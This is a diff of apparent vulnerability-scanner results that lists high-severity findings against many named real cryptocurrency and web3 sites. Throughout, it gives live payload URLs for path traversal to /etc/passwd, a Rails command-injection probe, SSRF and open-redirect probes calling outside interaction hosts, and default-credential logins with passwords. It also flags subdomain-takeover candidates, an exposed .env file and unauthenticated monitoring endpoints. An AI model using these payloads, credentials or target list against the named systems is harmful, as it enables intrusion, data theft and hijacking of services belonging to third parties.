@@ -1,27 +1,52 @@
+[CVE-2019-11248] [http] [high] https://influx-tnworkq43qr5xmc8.b.redstone.finance/debug/pprof/
+[CVE-2019-11248] [http] [high] https://quote.omni.apex.exchange/debug/pprof/
+[CVE-2019-11248] [http] [high] https://remote-write.switchboard.xyz/debug/pprof/
+[CVE-2019-7254] [http] [high] https://agentic-docs.polygon.technology/?c=../../../../../../etc/passwd%00
+[CVE-2020-8163] [http] [high] https://agentic-docs.polygon.technology?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+[CVE-2021-32820] [http] [high] https://agentic-docs.polygon.technology/?layout=/etc/passwd
+[CVE-2021-39316] [http] [high] https://agentic-docs.polygon.technology/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd
+[CVE-2024-34351] [http] [high] https://canary-onboard.fetch.ai/_next/image?w=16&q=10&url=https://d8pfooad99c3eukchudgo863nhy76hcmi.oast.online
+[CVE-2024-34351] [http] [high] https://explorer.humanity.org/_next/image?w=16&q=10&url=http://d8pusoromj13e6n9s4h0xn8qryou1338w.oast.me
+[CVE-2024-34351] [http] [high] https://onboard.fetch.ai/_next/image?w=16&q=10&url=https://d8qg323omj13epvgv0lgbsn8sj441axcd.oast.online
+[CVE-2024-34351] [http] [high] https://sandbox.spherepay.co/_next/image?w=16&q=10&url=https://d8qokfjomj13ef52ldigj6rs19x4ten6m.oast.online
+[CVE-2024-34351] [http] [high] https://spherepay.co/_next/image?w=16&q=10&url=https://d8qselromj13edptqlgga9daubfs8abyi.oast.live
+[CVE-2024-34351] [http] [high] https://staging-onboard.fetch.ai/_next/image?w=16&q=10&url=https://d8qslrjomj13e91avhh0xesq4psbdnpxp.oast.site
+[CVE-2024-34351] [http] [high] https://staging.spherepay.co/_next/image?w=16&q=10&url=https://d8qsp7bomj13f79kbgfgfd9exq5bdhb8r.oast.pro
+[CVE-2024-34351] [http] [high] https://www.spherepay.co/_next/image?w=16&q=10&url=https://d8rj0kromj13dnh2uke0s4ayru1uc7fun.oast.fun
 [CVE-2024-53991] [http] [high] https://community.venus.io/stylesheets/discourse-presence_c9ba78323842b5ede693429d2867ce490b07a7f8.css?__ws=community.venus.io&cachebuster=3FEZemwvQNxn2I9l2x8wILqj602
+[CVE-2024-53991] [http] [high] https://community.venus.io/stylesheets/discourse-presence_c9ba78323842b5ede693429d2867ce490b07a7f8.css?__ws=community.venus.io&cachebuster=3FHrY2DkPLjjRhUfsHxcxZro8IF
 [CVE-2024-53991] [http] [high] https://forum.celer.network/stylesheets/discourse-details_176b72e6e38dee06dfc1be8f35778491bd6261ea.css?__ws=forum.celer.network&cachebuster=3FFHXedhSZzvo07cZkQmtOEYGUQ
+[CVE-2024-53991] [http] [high] https://forum.celer.network/stylesheets/discourse-narrative-bot_176b72e6e38dee06dfc1be8f35778491bd6261ea.css?__ws=forum.celer.network&cachebuster=3FJfhcbDAPfhZK3sq9VDQKr6zb1
 [CVE-2025-4123:open-redirect] [http] [high] https://aevo-prod-monitor.socket.tech/public/..%2F%5coast.pro%2F%3f%2F..%2F..
 [CVE-2025-4123:open-redirect] [http] [high] https://grafana.switchboard.xyz/public/..%2F%5coast.pro%2F%3f%2F..%2F..
 [CVE-2025-4123:open-redirect] [http] [high] https://monitor.socket.tech/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://allin.sendai.fun
 [CVE-2025-55184] [http] [high] https://app.beta.galxe.com
 [CVE-2025-55184] [http] [high] https://app.galxe.com
 [CVE-2025-55184] [http] [high] https://app.grass.io
 [CVE-2025-55184] [http] [high] https://app.stg.galxe.com
+[CVE-2025-55184] [http] [high] https://blackjack.mini-games.sui.io
+[CVE-2025-55184] [http] [high] https://chatgpt.sendai.fun
 [CVE-2025-55184] [http] [high] https://create-next-app.privy.io
 [CVE-2025-55184] [http] [high] https://dashboard.beta.galxe.com
 [CVE-2025-55184] [http] [high] https://dashboard.galxe.com
 [CVE-2025-55184] [http] [high] https://demo.orderly.network/en/perp/PERP_ETH_USDC
+[CVE-2025-55184] [http] [high] https://dmm.orderly.network/en/perp/PERP_ETH_USDC
 [CVE-2025-55184] [http] [high] https://init.privy.io
 [CVE-2025-55184] [http] [high] https://status.across.to
 [CVE-2025-55184] [http] [high] https://testnet-dmm.orderly.network/en/perp/PERP_ETH_USDC
 [CVE-2025-55184] [http] [high] https://wallstreet.sendai.fun
 [CVE-2025-55184] [http] [high] https://web-ui.extension.prod.heyanon.ai
 [CVE-2025-55184] [http] [high] https://web-ui2.extension.dev.heyanon.ai
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://dune.com/login [password="password456",username="bob"]
 [apache-casbin-mcp-gateway-default-login] [http] [high] https://feedback.hop.exchange/login [password="password123",username="alice"]
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://feedback.hop.exchange/login [password="password456",username="bob"]
 [apache-casbin-mcp-gateway-default-login] [http] [high] https://ssr.warpcast.com/login [password="password456",username="bob"]
 [blockchain-rpc-txpool-exposed] [http] [high] https://api.0g.nansen.ai
 [blockchain-rpc-txpool-exposed] [http] [high] https://bepolia.rpc.berachain.com
 [blockchain-rpc-txpool-exposed] [http] [high] https://bsc-dataseed-public.bnbchain.org
+[blockchain-rpc-txpool-exposed] [http] [high] https://bsc-dataseed1.bnbchain.org
+[blockchain-rpc-txpool-exposed] [http] [high] https://bsc-dataseed2.bnbchain.org
 [blockchain-rpc-txpool-exposed] [http] [high] https://bsc-dataseed3.bnbchain.org
 [blockchain-rpc-txpool-exposed] [http] [high] https://bsc-dataseed4.bnbchain.org
 [blockchain-rpc-txpool-exposed] [http] [high] https://bsc-prebsc-dataseed.bnbchain.org
@@ -36,7 +61,9 @@
 [blockchain-rpc-txpool-exposed] [http] [high] https://l2-mainnet.wallet.coinbase.com
 [blockchain-rpc-txpool-exposed] [http] [high] https://node1.rpc.karak.network
 [blockchain-rpc-txpool-exposed] [http] [high] https://opbnb-mainnet-rpc.bnbchain.org
+[blockchain-rpc-txpool-exposed] [http] [high] https://opbnb-testnet-rpc.bnbchain.org
 [blockchain-rpc-txpool-exposed] [http] [high] https://partner.rpc.karak.network
+[blockchain-rpc-txpool-exposed] [http] [high] https://polygon-amoy-backend.phantom.app
 [blockchain-rpc-txpool-exposed] [http] [high] https://rpc-2.mainnet.taiko.xyz
 [blockchain-rpc-txpool-exposed] [http] [high] https://rpc-amoy.polygon.technology
 [blockchain-rpc-txpool-exposed] [http] [high] https://rpc.hoodi.taiko.xyz
@@ -49,10 +76,30 @@
 [blockchain-rpc-txpool-exposed] [http] [high] https://vflow-devnet-rpc.zkverify.io
 [blockchain-rpc-txpool-exposed] [http] [high] https://xai-mainnet.rpc.quicknode.com
 [blockchain-rpc-txpool-exposed] [http] [high] https://xai-testnet.rpc.quicknode.com
+[framer-takeover] [http] [high] https://bootcamp.meteora.ag
+[framer-takeover] [http] [high] https://interchain.synapseprotocol.com ["sites.framer.app"]
+[framer-takeover] [http] [high] https://points.nansen.ai ["sites.framer.app"]
+[framer-takeover] [http] [high] https://snowflake.flipsidecrypto.xyz ["magnificent-balance-420911.framer.app"]
+[framer-takeover] [http] [high] https://trade.nansen.ai ["sites.framer.app"]
+[framer-takeover] [http] [high] https://www.scroll.io
 [generic-env] [http] [high] https://admin.accessprotocol.co/.env [paths="/.env"]
+[github-takeover] [http] [high] http://staging-dex.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://github-test.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://proof.market.nil.foundation ["nilfoundation.github.io"]
+[github-takeover] [http] [high] https://swayapps.fuel.network
+[github-takeover] [http] [high] https://verify.mina.nil.foundation ["nilfoundation.github.io"]
+[github-takeover] [http] [high] https://verify.solana.nil.foundation ["nilfoundation.github.io"]
+[github-takeover] [http] [high] https://www.nil.foundation ["nilfoundation.github.io"]
+[grafana-unauth-access:dashboard-search-exposed] [http] [high] https://analytics.zeta.markets/api/search?type=dash-db
+[grafana-unauth-access:dashboard-search-exposed] [http] [high] https://metrics.solana.com/api/search?type=dash-db
+[grafana-unauth-access:dashboard-search-exposed] [http] [high] https://stats.marinade.finance/api/search?type=dash-db
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/api/v1/status/config
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/config
 [rabbitmq-default-login] [http] [high] https://rabbitmq.internal.taiko.xyz/api/whoami [password="guest",username="guest"]
 [retool-postmessage-xss] [http] [high] https://coreapp.worldcoin.org/libs/custom-component-collections.BRBIdv1C.umd.js
 [retool-postmessage-xss] [http] [high] https://partner.coreapp.worldcoin.org/libs/custom-component-collections.BRBIdv1C.umd.js
+[retool-postmessage-xss] [http] [high] https://partner.coreapp.worldcoin.org/libs/custom-component-collections.C_VNbUWp.umd.js
 [retool-postmessage-xss] [http] [high] https://staging.coreapp.worldcoin.org/libs/custom-component-collections.C_VNbUWp.umd.js
 [retool-postmessage-xss] [http] [high] https://trading.worldcoin.org/libs/custom-component-collections.BRBIdv1C.umd.js
 [unify-hipath-default-login] [http] [high] https://boost.birdeye.so/cgi-bin/ikon_button.exe?page=1500&button=51&line=0&eventid=0&WbmSessionId=nosession&Username=Unify&Password=1q21q2&CountryCode=en&NoSessionTimeout=false&SwitchLanguage=false [pass="1q21q2",user="Unify"]
+[wp-vault-local-file-inclusion] [http] [high] https://agentic-docs.polygon.technology/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
